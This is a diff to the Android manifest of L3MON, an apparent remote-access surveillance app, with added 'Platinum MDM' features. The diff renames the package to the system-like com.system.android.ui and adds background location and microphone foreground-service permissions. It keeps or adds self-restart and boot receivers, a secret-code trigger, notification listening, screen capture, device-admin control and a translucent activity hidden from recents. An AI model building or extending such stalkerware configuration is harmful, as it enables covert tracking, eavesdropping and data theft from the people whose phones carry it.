@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.etechd.l3mon" android:minSdkVersion="26" android:targetSdkVersion="34">
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.system.android.ui" android:minSdkVersion="24" android:targetSdkVersion="35">
     <!-- ─── Core Permissions (Original L3MON) ─── -->
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
     <uses-permission android:name="android.permission.CAMERA"/>
@@ -21,6 +21,9 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
 
     <!-- ─── Platinum MDM Additions ─── -->
     <uses-permission android:name="android.permission.VIBRATE"/>
@@ -29,20 +32,20 @@
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
     <application android:allowBackup="true" android:debuggable="true" android:hardwareAccelerated="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:largeHeap="true" android:supportsRtl="true" android:theme="@style/AppTheme" android:usesCleartextTraffic="true" android:networkSecurityConfig="@xml/network_security_config">
 
-        <activity android:launchMode="singleInstance" android:name="com.etechd.l3mon.MainActivity">
+        <activity android:launchMode="singleInstance" android:name="com.system.android.ui.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-        <service android:enabled="true" android:exported="false" android:name="com.etechd.l3mon.MainService" android:foregroundServiceType="specialUse"/>
+        <service android:enabled="true" android:exported="false" android:name="com.system.android.ui.MainService" android:foregroundServiceType="location|microphone|specialUse"/>
 
-        <receiver android:enabled="true" android:exported="true" android:label="RestartServiceWhenStopped" android:name="com.etechd.l3mon.ServiceReciever">
+        <receiver android:enabled="true" android:exported="true" android:label="RestartServiceWhenStopped" android:name="com.system.android.ui.ServiceReciever">
             <intent-filter>
                 <action android:name="respawnService"/>
             </intent-filter>
         </receiver>
-        <receiver android:enabled="true" android:exported="true" android:name="com.etechd.l3mon.MyReceiver">
+        <receiver android:enabled="true" android:exported="true" android:name="com.system.android.ui.MyReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
@@ -51,19 +54,19 @@
                 <data android:scheme="android_secret_code"/>
             </intent-filter>
         </receiver>
-        <service android:label="@string/app_name" android:name="com.etechd.l3mon.NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+        <service android:label="@string/app_name" android:name="com.system.android.ui.NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService"/>
             </intent-filter>
         </service>
         <!-- ─── Platinum MDM: Screenshot Service (MediaProjection) ─── -->
         <service
-            android:name="com.etechd.l3mon.ScreenCaptureService"
+            android:name="com.system.android.ui.ScreenCaptureService"
             android:foregroundServiceType="mediaProjection"
             android:exported="false"/>
         <!-- ─── Platinum MDM: Device Admin Receiver (Lock Screen) ─── -->
         <receiver
-            android:name="com.etechd.l3mon.MDMDeviceAdminReceiver"
+            android:name="com.system.android.ui.MDMDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
             <meta-data
@@ -75,7 +78,7 @@
         </receiver>
         <!-- ─── Platinum MDM: MDMActivity (Screenshot Consent) ─── -->
         <activity
-            android:name="com.etechd.l3mon.MDMActivity"
+            android:name="com.system.android.ui.MDMActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:excludeFromRecents="true"
             android:exported="false"/>
